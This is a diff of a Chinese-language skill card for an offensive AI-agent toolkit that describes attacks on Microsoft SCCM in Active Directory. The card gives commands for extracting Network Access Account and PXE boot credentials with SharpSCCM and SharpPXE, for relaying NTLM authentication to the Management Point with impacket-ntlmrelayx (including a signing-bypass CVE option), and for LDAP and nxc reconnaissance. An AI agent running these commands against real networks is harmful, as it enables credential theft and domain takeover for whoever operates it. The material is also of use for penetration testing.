@@ -4,7 +4,7 @@ description: 'SCCM攻击：NAA提取+MP中继+PXE引导凭据。企业级AD环�
 disable-model-invocation: true
 metadata: { domain: ad-win, tier: T2 }
 ---
-> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。
+> 📌 DSH 用法：按卡名用 skill 工具加载；长任务用 bash 后台任务、并行侦察用 subagent。
 
 ## SCCM / Configuration Manager 攻击
 
@@ -21,7 +21,7 @@ metadata: { domain: ad-win, tier: T2 }
 # 利用工具: SharpSCCM
 SharpSCCM.exe get naa
 # NAA 通常有域管理员级别的访问 OSD 部署共享
-```
+```text
 
 #### B: PXE Boot Media 提取
 ```bash
@@ -29,14 +29,15 @@ SharpSCCM.exe get naa
 # 工具: SharpPXE 
 SharpPXE.exe
 # → 从 PXE 引导镜像提取 domain join 凭据
-```
+```text
 
 #### C: MP 中继（NTLM Relay）
 ```bash
-# SCCM Management Point 接受 HTTP NTLM 认证
-# 如果 MP 配置为 HTTP（非 HTTPS）→ 中继到其他服务
-impacket-ntlmrelayx -t smb://<target> -smb2support --no-smb-server
-```
+# SCCM Management Point 配 HTTP(NTLM) 且不强制签名时，把客户端机器账户的认证中继回 MP 本身
+# 目标: MP 的 /ccm_system/request 端点 → 注册为受管设备(机器账户身份)
+impacket-ntlmrelayx -t http://<MP_IP>/ccm_system/request -smb2support
+# MP 强制签名 → 中继到其他服务(如 SMB) 或改用 CVE-2025-33073 --remove-sign-seal
+```text
 
 #### D: Client Push 账户
 - SCCM 客户端推送安装账户是本地管理员
@@ -48,7 +49,7 @@ impacket-ntlmrelayx -t smb://<target> -smb2support --no-smb-server
 ldapsearch -H ldap://DC -b "CN=System Management,CN=System,DC=domain,DC=local"
 # 客户端探测（有凭据时）
 nxc smb <subnet> -u <user> -p <pass> -M sccm
-```
+```text
 
 ### 关键工具
 - **SharpSCCM**: NAA 提取、站点枚举、DP 内容枚举
